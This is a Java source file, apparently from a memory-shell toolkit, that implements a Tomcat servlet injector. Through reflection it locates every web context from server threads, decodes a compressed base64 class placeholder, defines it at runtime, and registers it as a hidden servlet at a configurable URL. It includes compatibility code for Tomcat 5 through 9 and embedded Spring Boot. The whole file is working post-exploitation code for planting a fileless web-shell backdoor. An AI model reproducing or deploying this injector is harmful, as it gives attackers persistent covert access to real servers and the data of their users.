package com.reajason.javaweb.memshell.tomcat.injector;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/15
 */
public class TomcatServletInjector {
    static {
        new TomcatServletInjector();
    }

    public TomcatServletInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object servlet = getShell(context);
                inject(context, servlet);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() {
        return "{{base64Str}}";
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    @SuppressWarnings("all")
    public List<Object> getContext() throws Exception {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads", null, null);
        Object context = null;
        for (Thread thread : threads) {
            // 适配 v5/v6/7/8
            if (thread.getName().contains("ContainerBackgroundProcessor") && context == null) {
                HashMap childrenMap = (HashMap) getFieldValue(getFieldValue(getFieldValue(thread, "target"), "this$0"), "children");
                // 原: map.get("localhost")
                // 之前没有对 StandardHost 进行遍历，只考虑了 localhost 的情况，如果目标自定义了 host,则会获取不到对应的 context，导致注入失败
                for (Object key : childrenMap.keySet()) {
                    HashMap children = (HashMap) getFieldValue(childrenMap.get(key), "children");
                    // 原: context = children.get("");
                    // 之前没有对context map进行遍历，只考虑了 ROOT context 存在的情况，如果目标tomcat不存在 ROOT context，则会注入失败
                    for (Object key1 : children.keySet()) {
                        context = children.get(key1);
                        if (context != null && context.getClass().getName().contains("StandardContext")) {
                            contexts.add(context);
                        }
                        // 兼容 spring boot 2.x embedded tomcat
                        if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                            contexts.add(context);
                        }
                    }
                }
            }
            // 适配 tomcat v9
            else if (thread.getContextClassLoader() != null && (thread.getContextClassLoader().getClass().toString().contains("ParallelWebappClassLoader") || thread.getContextClassLoader().getClass().toString().contains("TomcatEmbeddedWebappClassLoader"))) {
                context = getFieldValue(getFieldValue(thread.getContextClassLoader(), "resources"), "context");
                if (context != null && context.getClass().getName().contains("StandardContext")) {
                    contexts.add(context);
                }
                if (context != null && context.getClass().getName().contains("TomcatEmbeddedContext")) {
                    contexts.add(context);
                }
            }
        }
        return contexts;
    }

    @SuppressWarnings("all")
    private Object getShell(Object context) throws Exception {
        Object obj;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            obj = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
            obj = clazz.newInstance();
        }
        return obj;
    }

    @SuppressWarnings("all")
    public void inject(Object context, Object servlet) throws Exception {
        if (isInjected(context)) {
            System.out.println("servlet already injected");
            return;
        }
        Class<?> containerClass = null;
        try {
            containerClass = Class.forName("org.apache.catalina.Container");
        } catch (ClassNotFoundException var12) {
            containerClass = Class.forName("org.apache.catalina.Container", true, context.getClass().getClassLoader());
        }

        Object wrapper = invokeMethod(context, "createWrapper", null, null);
        invokeMethod(wrapper, "setName", new Class[]{String.class}, new Object[]{getClassName()});
        invokeMethod(wrapper, "setLoadOnStartup", new Class[]{Integer.TYPE}, new Object[]{1});
        setFieldValue(wrapper, "instance", servlet);
        invokeMethod(wrapper, "setServletClass", new Class[]{String.class}, new Object[]{this.getClassName()});
        invokeMethod(context, "addChild", new Class[]{containerClass}, new Object[]{wrapper});

        try {
            invokeMethod(context, "addServletMapping", new Class[]{String.class, String.class}, new Object[]{getUrlPattern(), getClassName()});
        } catch (NoSuchMethodException var11) {
            invokeMethod(context, "addServletMappingDecoded", new Class[]{String.class, String.class, Boolean.TYPE}, new Object[]{getUrlPattern(), getClassName(), false});
        }
        support56Inject(context, wrapper);
        System.out.println("servlet inject success");
    }

    @SuppressWarnings("all")
    public boolean isInjected(Object context) throws Exception {
        Map<String, String> servletMappings = (Map<String, String>) getFieldValue(context, "servletMappings");
        Collection<String> values = servletMappings.values();
        for (String name : values) {
            if (name.equals(getClassName())) {
                return true;
            }
        }
        return false;
    }

    private void support56Inject(Object context, Object wrapper) throws Exception {
        Class<?> serverInfo = Class.forName("org.apache.catalina.util.ServerInfo", false, context.getClass().getClassLoader());
        String number = (String) invokeMethod(serverInfo, "getServerNumber", null, null);
        if (!number.startsWith("5") && !number.startsWith("6")) {
            return;
        }
        Object connectors = getFieldValue(getFieldValue(getFieldValue(getFieldValue(context, "parent"), "parent"), "service"), "connectors");
        int connectorsLength = Array.getLength(connectors);
        for (int i = 0; i < connectorsLength; ++i) {
            Object connector = Array.get(connectors, i);
            String protocolHandlerClassName = (String) getFieldValue(connector, "protocolHandlerClassName");
            if (!protocolHandlerClassName.contains("Http")) {
                continue;
            }
            Object contexts = getFieldValue(getFieldValue(Array.get(getFieldValue(getFieldValue(connector, "mapper"), "hosts"), 0), "contextList"), "contexts");
            int contextsLength = Array.getLength(contexts);
            for (int j = 0; j < contextsLength; ++j) {
                Object o = Array.get(contexts, j);
                if (getFieldValue(o, "object") != context) {
                    continue;
                }
                Class<?> mapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper", false, context.getClass().getClassLoader());
                Class<?> wrapperClazz = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$Wrapper", false, context.getClass().getClassLoader());
                Constructor<?> declaredConstructor = wrapperClazz.getDeclaredConstructors()[0];
                declaredConstructor.setAccessible(true);
                Object newWrapper = declaredConstructor.newInstance();
                setFieldValue(newWrapper, "object", wrapper);
                setFieldValue(newWrapper, "jspWildCard", false);
                setFieldValue(newWrapper, "name", getUrlPattern());

                Object exactWrappers = getFieldValue(o, "exactWrappers");
                int length = Array.getLength(exactWrappers);
                Object newWrappers = Array.newInstance(wrapperClazz, length + 1);
                Class<?> mapElementClass = Class.forName("org.apache.tomcat.util.http.mapper.Mapper$MapElement", false, context.getClass().getClassLoader());
                Class<?> mapElementArrayClass = Array.newInstance(mapElementClass, 0).getClass();
                invokeMethod(mapperClazz, "insertMap", new Class[]{mapElementArrayClass, mapElementArrayClass, mapElementClass}, new Object[]{exactWrappers, newWrappers, newWrapper});
                setFieldValue(o, "exactWrappers", newWrappers);
            }
        }
    }


    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;

        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
        } finally {
            if (gzipInputStream != null) {
                try {
                    gzipInputStream.close();
                } catch (IOException ignored) {
                }
            }
            out.close();
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    @SuppressWarnings("all")
    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws NoSuchMethodException {
        try {
            Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
            Method method = null;
            while (clazz != null && method == null) {
                try {
                    if (paramClazz == null) {
                        method = clazz.getDeclaredMethod(methodName);
                    } else {
                        method = clazz.getDeclaredMethod(methodName, paramClazz);
                    }
                } catch (NoSuchMethodException e) {
                    clazz = clazz.getSuperclass();
                }
            }
            if (method == null) {
                throw new NoSuchMethodException("Method not found: " + methodName);
            }
            method.setAccessible(true);
            return method.invoke(obj instanceof Class ? null : obj, param);
        } catch (NoSuchMethodException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException("Error invoking method: " + methodName, e);
        }
    }
}
